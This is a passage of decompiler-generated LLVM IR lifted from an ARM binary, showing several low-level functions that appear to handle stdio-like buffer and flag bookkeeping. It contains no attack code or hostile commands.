  %v2_156e0 = add i32 %tmp, %arg3
  store i32 %v2_156e0, i32* @ip, align 4
  store i32 %v1_15690, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15790

dec_label_pc_156fc:                               ; preds = %dec_label_pc_15790
  %v1_156fc = add i32 %v0_15750, 16
  %v2_156fc = inttoptr i32 %v1_156fc to i16*
  %v3_156fc = load i16, i16* %v2_156fc, align 2
  %v4_156fc = zext i16 %v3_156fc to i32
  %v1_15700 = add nuw nsw i32 %v4_156fc, 7
  %v1_15704 = and i32 %v1_15700, 131064
  store i32 %v1_15704, i32* %r2.global-to-local, align 4
  %v2_1570c = add i32 %v1_15704, %v0_15758
  store i32 %v2_1570c, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1570c, %v2_156e0
  br i1 %tmp26, label %dec_label_pc_15718, label %dec_label_pc_1574c

dec_label_pc_15718:                               ; preds = %dec_label_pc_156fc
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_15720 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15720, i32* %r2.global-to-local, align 4
  %v0_15724 = load i32, i32* %sl.global-to-local, align 4
  %v1_15728 = load i32, i32* @sp, align 4
  %v2_15728 = inttoptr i32 %v1_15728 to i32*
  store i32 0, i32* %v2_15728, align 4
  %v4_1572c = call i32 @function_17534(i32 %arg1, i32 0, i32 %v0_15720, i32 %v0_15724)
  %v0_15730 = load i32, i32* @r5, align 4
  %v1_15730 = load i32, i32* %r6.global-to-local, align 4
  %v9_15730 = icmp eq i32 %v0_15730, %v1_15730
  br i1 %v9_15730, label %dec_label_pc_15738, label %dec_label_pc_157a4

dec_label_pc_15738:                               ; preds = %dec_label_pc_15718
  %v0_15738 = call i32 @function_ce08()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_15744 = inttoptr i32 %v0_15738 to i32*
  store i32 22, i32* %v2_15744, align 4
  %v0_157a8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_157a8

dec_label_pc_1574c:                               ; preds = %dec_label_pc_156fc
  %v1_1574c = inttoptr i32 %v0_15750 to i32*
  %v2_1574c = load i32, i32* %v1_1574c, align 4
  %v3_1574c = add i32 %v0_15750, 4
  %v4_1574c = inttoptr i32 %v3_1574c to i32*
  %v5_1574c = load i32, i32* %v4_1574c, align 4
  store i32 %v5_1574c, i32* %r4.global-to-local, align 4
  %v1_15750 = add i32 %v0_15750, 8
  store i32 %v1_15750, i32* %sb.global-to-local, align 4
  %v1_15754 = inttoptr i32 %v1_15750 to i32*
  %v2_15754 = load i32, i32* %v1_15754, align 4
  store i32 %v2_15754, i32* %sb.global-to-local, align 4
  %v3_15754 = add i32 %v0_15750, 12
  %v4_15754 = inttoptr i32 %v3_15754 to i32*
  %v5_15754 = load i32, i32* %v4_15754, align 4
  store i32 %v5_15754, i32* %sl.global-to-local, align 4
  %v1_15758 = inttoptr i32 %v0_15758 to i32*
  store i32 %v2_1574c, i32* %v1_15758, align 4
  %v3_15758 = add i32 %v0_15758, 4
  %v4_15758 = inttoptr i32 %v3_15758 to i32*
  %v5_15758 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15758, i32* %v4_15758, align 4
  %v0_1575c = load i32, i32* @r7, align 4
  %v1_1575c = add i32 %v0_1575c, 8
  %v1_15760 = inttoptr i32 %v1_1575c to i32*
  %v2_15760 = load i32, i32* %v1_15760, align 4
  %v3_15760 = add i32 %v0_1575c, 12
  %v4_15760 = inttoptr i32 %v3_15760 to i32*
  %v5_15760 = load i32, i32* %v4_15760, align 4
  store i32 %v5_15760, i32* @r4, align 4
  %v1_15764 = load i32, i32* @r5, align 4
  %v2_15764 = add i32 %v1_15764, 8
  %v3_15764 = inttoptr i32 %v2_15764 to i32*
  store i32 %v2_15760, i32* %v3_15764, align 4
  %v0_15768 = load i32, i32* @r4, align 4
  %v1_15768 = load i32, i32* @r5, align 4
  %v2_15768 = add i32 %v1_15768, 12
  %v3_15768 = inttoptr i32 %v2_15768 to i32*
  store i32 %v0_15768, i32* %v3_15768, align 4
  %v0_1576c = load i32, i32* %r2.global-to-local, align 4
  %v1_1576c = trunc i32 %v0_1576c to i16
  %v2_1576c = load i32, i32* @r5, align 4
  %v3_1576c = add i32 %v2_1576c, 16
  %v4_1576c = inttoptr i32 %v3_1576c to i16*
  store i16 %v1_1576c, i16* %v4_1576c, align 2
  %v0_15770 = load i32, i32* @r7, align 4
  %v1_15770 = add i32 %v0_15770, 18
  %v2_15770 = inttoptr i32 %v1_15770 to i8*
  %v3_15770 = load i8, i8* %v2_15770, align 1
  %v4_15770 = zext i8 %v3_15770 to i32
  store i32 %v4_15770, i32* @r3, align 4
  %v2_15774 = load i32, i32* @r5, align 4
  %v3_15774 = add i32 %v2_15774, 18
  %v4_15774 = inttoptr i32 %v3_15774 to i8*
  store i8 %v3_15770, i8* %v4_15774, align 1
  %v0_15778 = load i32, i32* @r7, align 4
  %v1_15778 = add i32 %v0_15778, 16
  %v2_15778 = inttoptr i32 %v1_15778 to i16*
  %v3_15778 = load i16, i16* %v2_15778, align 2
  %v4_15778 = zext i16 %v3_15778 to i32
  %v1_1577c = add nsw i32 %v4_15778, -19
  store i32 %v1_1577c, i32* @r2, align 4
  %v0_15780 = call i32 @function_f350()
  %v0_15784 = load i32, i32* @r7, align 4
  %v1_15784 = add i32 %v0_15784, 16
  %v2_15784 = inttoptr i32 %v1_15784 to i16*
  %v3_15784 = load i16, i16* %v2_15784, align 2
  %v4_15784 = zext i16 %v3_15784 to i32
  %v0_15788 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15788, i32* @r5, align 4
  %v2_1578c = add i32 %v4_15784, %v0_15784
  store i32 %v2_1578c, i32* @r7, align 4
  br label %dec_label_pc_15790

dec_label_pc_15790:                               ; preds = %dec_label_pc_156dc, %dec_label_pc_1574c
  %v0_15758 = phi i32 [ %tmp, %dec_label_pc_156dc ], [ %v0_15788, %dec_label_pc_1574c ]
  %v0_15750 = phi i32 [ %v1_15690, %dec_label_pc_156dc ], [ %v2_1578c, %dec_label_pc_1574c ]
  %v3_15794 = icmp ult i32 %v0_15750, %v2_156dc
  %v1_15798 = add i32 %v0_15758, 19
  store i32 %v1_15798, i32* @r0, align 4
  %v1_1579c = add i32 %v0_15750, 19
  store i32 %v1_1579c, i32* @r1, align 4
  br i1 %v3_15794, label %dec_label_pc_156fc, label %dec_label_pc_157a4.loopexit

dec_label_pc_157a4.loopexit:                      ; preds = %dec_label_pc_15790
  %v0_157a4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_157a4

dec_label_pc_157a4:                               ; preds = %dec_label_pc_157a4.loopexit, %dec_label_pc_15718
  %v1_157a4 = phi i32 [ %v0_15758, %dec_label_pc_157a4.loopexit ], [ %v0_15730, %dec_label_pc_15718 ]
  %v0_157a4 = phi i32 [ %v0_157a4.pre, %dec_label_pc_157a4.loopexit ], [ %v1_15730, %dec_label_pc_15718 ]
  %v2_157a4 = sub i32 %v1_157a4, %v0_157a4
  store i32 %v2_157a4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_157a8

dec_label_pc_157a8:                               ; preds = %dec_label_pc_15738, %dec_label_pc_156d4, %dec_label_pc_157a4
  %v0_157a8 = phi i32 [ %v0_157a8.pre, %dec_label_pc_15738 ], [ %v0_156d4, %dec_label_pc_156d4 ], [ %v2_157a4, %dec_label_pc_157a4 ]
  store i32 %v3_15678, i32* %r4.global-to-local, align 4
  store i32 %v6_15678, i32* @r5, align 4
  store i32 %v12_15678, i32* @r7, align 4
  ret i32 %v0_157a8

; uselistorder directives
  uselistorder i32 %v0_15750, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_15758, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_15690, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 18, { 2, 3, 4, 0, 1 }
  uselistorder i32* @sp, { 0, 3, 2, 1 }
  uselistorder i32 14, { 3, 0, 7, 4, 5, 1, 2, 6 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_157a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15790, { 1, 0 }
}

define i32 @function_157b8() local_unnamed_addr {
dec_label_pc_157b8:
  %v0_157c4 = load i32, i32* @r1, align 4
  store i32 %v0_157c4, i32* @r2, align 4
  %v0_157cc = call i32 @function_157dc()
  ret i32 %v0_157cc
}

define i32 @function_157dc() local_unnamed_addr {
dec_label_pc_157dc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_157dc = load i32, i32* @r4, align 4
  %v6_157dc = load i32, i32* @r5, align 4
  %v12_157dc = load i32, i32* @r7, align 4
  store i32 %tmp14, i32* @r7, align 4
  %v0_157f0 = load i32, i32* @r2, align 4
  store i32 %v0_157f0, i32* %stack_var_-32, align 4
  store i32 142044, i32* %r6.global-to-local, align 4
  %v0_157fc = load i32, i32* @r0, align 4
  store i32 %v0_157fc, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp14, 3
  br i1 %tmp, label %dec_label_pc_15818, label %dec_label_pc_15804

dec_label_pc_15804:                               ; preds = %dec_label_pc_157dc
  %v0_15804 = call i32 @function_ce08()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15810 = inttoptr i32 %v0_15804 to i32*
  store i32 22, i32* %v2_15810, align 4
  br label %dec_label_pc_15908

dec_label_pc_15818:                               ; preds = %dec_label_pc_157dc
  %v1_15818 = add i32 %v0_157fc, 52
  %v2_15818 = inttoptr i32 %v1_15818 to i32*
  %v3_15818 = load i32, i32* %v2_15818, align 4
  %v1_1581c = sub i32 1, %v3_15818
  store i32 %v1_1581c, i32* %r8.global-to-local, align 4
  %v2_1581c = icmp ult i32 %v3_15818, 2
  br i1 %v2_1581c, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_15818
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15864

bb:                                               ; preds = %dec_label_pc_15818
  %v2_15824 = icmp eq i32 %v1_1581c, 0
  br i1 %v2_15824, label %dec_label_pc_15864, label %dec_label_pc_1582c

dec_label_pc_1582c:                               ; preds = %bb
  %v1_15830 = add i32 %v0_157fc, 56
  store i32 %v1_15830, i32* @r4, align 4
  %v4_15834 = load i32, i32* inttoptr (i32 142080 to i32*), align 256
  store i32 %v4_15834, i32* %r1.global-to-local, align 4
  store i32 %v1_15830, i32* %r2.global-to-local, align 4
  %v4_15844 = load i32, i32* inttoptr (i32 142120 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_15844)
  %v0_15858 = load i32, i32* %r6.global-to-local, align 4
  %v2_15858 = add i32 %v0_15858, 16
  %v3_15858 = inttoptr i32 %v2_15858 to i32*
  %v4_15858 = load i32, i32* %v3_15858, align 4
  store i32 %v4_15858, i32* @ip, align 4
  store i32 88164, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15858)
  %v0_15864.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15864

dec_label_pc_15864:                               ; preds = %.thread, %bb, %dec_label_pc_1582c
  %v0_15870 = phi i32 [ %v0_157fc, %.thread ], [ %v0_157fc, %bb ], [ %v0_15864.pre, %dec_label_pc_1582c ]
  %v1_15864 = inttoptr i32 %v0_15870 to i16*
  %v2_15864 = load i16, i16* %v1_15864, align 2
  %v1_15868 = and i16 %v2_15864, 64
  %v2_15868 = icmp eq i16 %v1_15868, 0
  br i1 %v2_15868, label %dec_label_pc_15880, label %dec_label_pc_15870

dec_label_pc_15870:                               ; preds = %dec_label_pc_15864
  store i32 %v0_15870, i32* @r0, align 4
  %v0_15874 = call i32 @function_d978()
  %v2_15878 = icmp eq i32 %v0_15874, 0
  br i1 %v2_15878, label %dec_label_pc_15880, label %dec_label_pc_158e8

dec_label_pc_15880:                               ; preds = %dec_label_pc_15870, %dec_label_pc_15864
  %v0_15880 = load i32, i32* @r7, align 4
  %v7_15880 = icmp eq i32 %v0_15880, 1
  br i1 %v7_15880, label %dec_label_pc_15888, label %dec_label_pc_15880.dec_label_pc_1589c_crit_edge

dec_label_pc_15880.dec_label_pc_1589c_crit_edge:  ; preds = %dec_label_pc_15880
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_1589c

dec_label_pc_15888:                               ; preds = %dec_label_pc_15880
  %v0_15888 = load i32, i32* @r5, align 4
  %v2_1588c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1588c, i32* %r1.global-to-local, align 4
  %v2_15890 = inttoptr i32 %v0_15888 to i16*
  %v3_15890 = call i32 @function_15984(i16* %v2_15890, i32 %v2_1588c)
  %v1_15894 = icmp slt i32 %v3_15890, 0
  br i1 %v1_15894, label %dec_label_pc_158e8, label %dec_label_pc_15888.dec_label_pc_1589c_crit_edge

dec_label_pc_15888.dec_label_pc_1589c_crit_edge:  ; preds = %dec_label_pc_15888
  %v0_1589c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1589c

dec_label_pc_1589c:                               ; preds = %dec_label_pc_15880.dec_label_pc_1589c_crit_edge, %dec_label_pc_15888.dec_label_pc_1589c_crit_edge
  %v2_158a4.pre-phi = phi i32 [ %.pre, %dec_label_pc_15880.dec_label_pc_1589c_crit_edge ], [ %v2_1588c, %dec_label_pc_15888.dec_label_pc_1589c_crit_edge ]
  %v0_1589c = phi i32 [ %v0_15880, %dec_label_pc_15880.dec_label_pc_1589c_crit_edge ], [ %v0_1589c.pre, %dec_label_pc_15888.dec_label_pc_1589c_crit_edge ]
  store i32 %v0_1589c, i32* %r2.global-to-local, align 4
  %v0_158a0 = load i32, i32* @r5, align 4
  store i32 %v2_158a4.pre-phi, i32* %r1.global-to-local, align 4
  %v4_158a8 = call i32 @function_15b10(i32 %v0_158a0, i32* nonnull %stack_var_-32, i32 %v0_1589c)
  %v1_158ac = icmp slt i32 %v4_158a8, 0
  br i1 %v1_158ac, label %dec_label_pc_158e8, label %dec_label_pc_158b4

dec_label_pc_158b4:                               ; preds = %dec_label_pc_1589c
  %v0_158b4 = load i32, i32* @r5, align 4
  %v1_158b4 = inttoptr i32 %v0_158b4 to i16*
  %v2_158b4 = load i16, i16* %v1_158b4, align 2
  %v1_158b8 = add i32 %v0_158b4, 8
  %v2_158b8 = inttoptr i32 %v1_158b8 to i32*
  %v3_158b8 = load i32, i32* %v2_158b8, align 4
  store i32 %v3_158b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_158c0 = and i16 %v2_158b4, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_158c0, i16* %v1_158b4, align 2
  %v0_158cc = load i32, i32* %r2.global-to-local, align 4
  %v1_158cc = load i32, i32* @r5, align 4
  %v2_158cc = add i32 %v1_158cc, 28
  %v3_158cc = inttoptr i32 %v2_158cc to i32*
  store i32 %v0_158cc, i32* %v3_158cc, align 4
  %v0_158d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_158d0 = trunc i32 %v0_158d0 to i8
  %v2_158d0 = load i32, i32* @r5, align 4
  %v3_158d0 = add i32 %v2_158d0, 2
  %v4_158d0 = inttoptr i32 %v3_158d0 to i8*
  store i8 %v1_158d0, i8* %v4_158d0, align 1
  %v0_158d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_158d4 = load i32, i32* @r5, align 4
  %v2_158d4 = add i32 %v1_158d4, 16
  %v3_158d4 = inttoptr i32 %v2_158d4 to i32*
  store i32 %v0_158d4, i32* %v3_158d4, align 4
  %v0_158d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_158d8 = load i32, i32* @r5, align 4
  %v2_158d8 = add i32 %v1_158d8, 20
  %v3_158d8 = inttoptr i32 %v2_158d8 to i32*
  store i32 %v0_158d8, i32* %v3_158d8, align 4
  %v0_158dc = load i32, i32* %r2.global-to-local, align 4
  %v1_158dc = load i32, i32* @r5, align 4
  %v2_158dc = add i32 %v1_158dc, 24
  %v3_158dc = inttoptr i32 %v2_158dc to i32*
  store i32 %v0_158dc, i32* %v3_158dc, align 4
  %v0_158e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_158e0 = load i32, i32* @r5, align 4
  %v2_158e0 = add i32 %v1_158e0, 44
  %v3_158e0 = inttoptr i32 %v2_158e0 to i32*
  store i32 %v0_158e0, i32* %v3_158e0, align 4
  br label %dec_label_pc_158ec

dec_label_pc_158e8:                               ; preds = %dec_label_pc_15870, %dec_label_pc_1589c, %dec_label_pc_15888
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_158ec

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158b4, %dec_label_pc_158e8
  %v0_158ec = load i32, i32* %r8.global-to-local, align 4
  %v2_158ec = icmp eq i32 %v0_158ec, 0
  br i1 %v2_158ec, label %dec_label_pc_158ec..thread6_crit_edge, label %bb18

dec_label_pc_158ec..thread6_crit_edge:            ; preds = %dec_label_pc_158ec
  %v0_15904.pre = load i32, i32* @ip, align 4
  br label %.thread6

bb18:                                             ; preds = %dec_label_pc_158ec
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_158fc = load i32, i32* %r6.global-to-local, align 4
  %v3_158fc = add i32 %v1_158fc, 24
  %v4_158fc = inttoptr i32 %v3_158fc to i32*
  %v5_158fc = load i32, i32* %v4_158fc, align 4
  store i32 %v5_158fc, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_158ec..thread6_crit_edge, %bb18
  %v0_15904 = phi i32 [ %v0_15904.pre, %dec_label_pc_158ec..thread6_crit_edge ], [ %v5_158fc, %bb18 ]
  %v2_15904 = xor i1 %v2_158ec, true
  call void @__pseudo_cond_branch(i1 %v2_15904, i32 %v0_15904)
  br label %dec_label_pc_15908

dec_label_pc_15908:                               ; preds = %dec_label_pc_15804, %.thread6
  %v0_15908 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_157dc, i32* @r4, align 4
  store i32 %v6_157dc, i32* @r5, align 4
  store i32 %v12_157dc, i32* @r7, align 4
  ret i32 %v0_15908

; uselistorder directives
  uselistorder i32 %v0_1589c, { 1, 0 }
  uselistorder i32 %v3_15818, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 142120 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 17, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 56, { 8, 6, 5, 3, 1, 2, 0, 9, 7, 10, 4, 11 }
  uselistorder label %dec_label_pc_15908, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_158ec, { 1, 0 }
  uselistorder label %dec_label_pc_158e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1589c, { 1, 0 }
  uselistorder label %dec_label_pc_15864, { 2, 1, 0 }
}

define i32 @function_1591c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1591c:
  %v0_1591c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1591c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1591c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1591c, %bb
  %v10_15928 = phi i32 [ %arg1, %dec_label_pc_1591c ], [ 0, %bb ]
  ret i32 %v10_15928

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1592c(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1592c:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1592c = load i32, i32* @r4, align 4
  store i32 %v3_1592c, i32* %stack_var_-12, align 4
  %v0_15930 = load i32, i32* %r0.global-to-local, align 4
  %v1_15930 = inttoptr i32 %v0_15930 to i16*
  %v2_15930 = load i16, i16* %v1_15930, align 2
  %v3_15930 = zext i16 %v2_15930 to i32
  %v1_15934 = and i32 %v3_15930, 4
  store i32 %v1_15934, i32* %r5.global-to-local, align 4
  %v2_15934 = icmp eq i32 %v1_15934, 0
  store i32 %v0_15930, i32* %r4.global-to-local, align 4
  br i1 %v2_15934, label %dec_label_pc_15948, label %bb

bb:                                               ; preds = %dec_label_pc_1592c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_15948:                               ; preds = %dec_label_pc_1592c
  %v1_15948 = icmp slt i32 %arg2, 0
  br i1 %v1_15948, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_15948
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_15948, %bb18
  %v1_15950 = add i32 %v0_15930, 4
  %v2_15950 = inttoptr i32 %v1_15950 to i32*
  %v3_15950 = load i32, i32* %v2_15950, align 4
  store i32 %v3_15950, i32* %r0.global-to-local, align 4
  %v1_15954 = call i32 @function_174a8(i32 %v3_15950)
  store i32 %v1_15954, i32* %r0.global-to-local, align 4
  %v5_1595c = icmp sgt i32 %v1_15954, 0
  br i1 %v5_1595c, label %.thread7, label %dec_label_pc_15960

dec_label_pc_15960:                               ; preds = %bb19
  %v2_15958 = icmp eq i32 %v1_15954, 0
  %v0_15960 = load i32, i32* %r4.global-to-local, align 4
  %v1_15960 = inttoptr i32 %v0_15960 to i16*
  %v2_15960 = load i16, i16* %v1_15960, align 2
  br i1 %v2_15958, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15960
  %v2_15964 = or i16 %v2_15960, 4
  store i16 %v2_15964, i16* %v1_15960, align 2
  %v1_15980.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_15960
  %v2_15968 = or i16 %v2_15960, 8
  store i16 %v2_15968, i16* %v1_15960, align 2
  %v1_15974 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15974, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_15980 = phi i32 [ %v1_15980.pre, %bb20 ], [ 0, %bb ], [ %v1_15954, %bb19 ], [ %v1_15974, %bb21 ]
  %v2_1597c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1597c, i32* @r4, align 4
  ret i32 %v1_15980

; uselistorder directives
  uselistorder i16 %v2_15960, { 1, 0 }
  uselistorder i32 %v1_15954, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_15984(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15984:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15984 = load i32, i32* @r4, align 4
  store i32 %v3_15984, i32* %stack_var_-12, align 4
  %v3_15988 = load i16, i16* %arg1, align 2
  %v4_15988 = zext i16 %v3_15988 to i32
  store i32 %v4_15988, i32* @ip, align 4
  %tmp17 = urem i16 %v3_15988, 4
  %v1_1598c = zext i16 %tmp17 to i32
  store i32 %v1_1598c, i32* %r2.global-to-local, align 4
  %v2_1598c = icmp eq i16 %tmp17, 0
  br i1 %v2_1598c, label %bb, label %dec_label_pc_159a0

bb:                                               ; preds = %dec_label_pc_15984
  br label %bb14

dec_label_pc_159a0:                               ; preds = %dec_label_pc_15984
  %v1_159a0 = add nsw i32 %v1_1598c, -1
  %v7_159a0 = icmp eq i16 %tmp17, 1
  br i1 %v7_159a0, label %bb14, label %dec_label_pc_159a8

dec_label_pc_159a8:                               ; preds = %dec_label_pc_159a0
  %v1_159a8 = and i32 %v4_15988, 2048
  %v2_159a8 = icmp eq i32 %v1_159a8, 0
  br i1 %v2_159a8, label %bb14, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_159a8
  %v7_159b0 = icmp eq i32 %v1_159a0, 2
  br i1 %v7_159b0, label %dec_label_pc_15a34, label %dec_label_pc_159b8

dec_label_pc_159b8:                               ; preds = %dec_label_pc_159b0
  %v2_159b8 = add i32 %tmp, 40
  %v3_159b8 = inttoptr i32 %v2_159b8 to i32*
  %v4_159b8 = load i32, i32* %v3_159b8, align 4
  store i32 %v4_159b8, i32* %r3.global-to-local, align 4
  %v2_159bc = icmp eq i32 %v4_159b8, 0
  br i1 %v2_159bc, label %dec_label_pc_159c4, label %dec_label_pc_15a34

dec_label_pc_159c4:                               ; preds = %dec_label_pc_159b8
  %v2_159c4 = add i32 %tmp, 44
  %v3_159c4 = inttoptr i32 %v2_159c4 to i32*
  %v4_159c4 = load i32, i32* %v3_159c4, align 4
  store i32 %v4_159c4, i32* %r3.global-to-local, align 4
  %v2_159c8 = add i32 %tmp, 3
  %v3_159c8 = inttoptr i32 %v2_159c8 to i8*
  %v4_159c8 = load i8, i8* %v3_159c8, align 1
  %v5_159c8 = zext i8 %v4_159c8 to i32
  store i32 %v5_159c8, i32* %r2.global-to-local, align 4
  %v2_159cc = icmp eq i32 %v4_159c4, 0
  br i1 %v2_159cc, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_159c4
  %v1_159d43 = sub nsw i32 0, %v5_159c8
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_159c4
  %v3_159d0 = add i32 %tmp, 2
  %v4_159d0 = inttoptr i32 %v3_159d0 to i8*
  %v5_159d0 = load i8, i8* %v4_159d0, align 1
  %v6_159d0 = zext i8 %v5_159d0 to i32
  store i32 %v6_159d0, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_159d0, %v5_159c8
  %v3_159d8 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_159a8, %dec_label_pc_159a0, %bb13
  %v1_159ec = phi i32 [ %v1_159d43, %.thread1 ], [ %v1_159a0, %dec_label_pc_159a8 ], [ %v1_159a0, %dec_label_pc_159a0 ], [ 0, %bb ], [ %v3_159d8, %bb13 ]
  %v1_159dc = and i32 %v4_15988, 64
  %v2_159dc = icmp eq i32 %v1_159dc, 0
  %v2_159e0 = add i32 %tmp, 16
  %v3_159e0 = inttoptr i32 %v2_159e0 to i32*
  %v4_159e0 = load i32, i32* %v3_159e0, align 4
  store i32 %v4_159e0, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_159dc, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_159ec = sub i32 %v1_159ec, %v4_159e0
  store i32 %v2_159ec, i32* %r3.global-to-local, align 4
  %v1_159f0 = inttoptr i32 %arg2 to i32*
  %v2_159f0 = load i32, i32* %v1_159f0, align 4
  store i32 %v2_159f0, i32* %r0.global-to-local, align 4
  %v3_159f0 = add i32 %arg2, 4
  %v4_159f0 = inttoptr i32 %v3_159f0 to i32*
  %v5_159f0 = load i32, i32* %v4_159f0, align 4
  %v2_159f4 = add i32 %storemerge, %v2_159ec
  store i32 %v2_159f4, i32* %r4.global-to-local, align 4
  %v2_159f8 = sub i32 %v2_159f0, %v2_159f4
  store i32 %v2_159f8, i32* %r2.global-to-local, align 4
  %v2_159fc = and i32 %v2_159f4, 1073741824
  %v3_159fc = icmp ne i32 %v2_159fc, 0
  %v4_159fc = ashr i32 %v2_159f4, 31
  %v6_159fc = icmp eq i1 %v3_159fc, false
  %v7_159fc = sub i32 %v5_159f0, %v4_159fc
  %v9_159fc = sext i1 %v6_159fc to i32
  %v10_159fc = add i32 %v7_159fc, %v9_159fc
  store i32 %v10_159fc, i32* %r3.global-to-local, align 4
  %v2_15a00 = sub i32 %v10_159fc, %v5_159f0
  %v4_15a00 = xor i32 %v10_159fc, %v5_159f0
  %v5_15a00 = xor i32 %v2_15a00, %v10_159fc
  %v6_15a00 = and i32 %v5_15a00, %v4_15a00
  %v7_15a00 = icmp slt i32 %v6_15a00, 0
  %v8_15a00 = icmp slt i32 %v2_15a00, 0
  %v9_15a00 = icmp eq i32 %v10_159fc, %v5_159f0
  store i32 %v2_159f8, i32* %v1_159f0, align 4
  %v5_15a04 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15a04, i32* %v4_159f0, align 4
  %v3_15a08 = xor i1 %v8_15a00, %v7_15a00
  %v4_15a08 = or i1 %v9_15a00, %v3_15a08
  br i1 %v4_15a08, label %dec_label_pc_15a0c, label %dec_label_pc_15a18

dec_label_pc_15a0c:                               ; preds = %bb14
  br i1 %v9_15a00, label %dec_label_pc_15a10, label %dec_label_pc_15a1cthread-pre-split

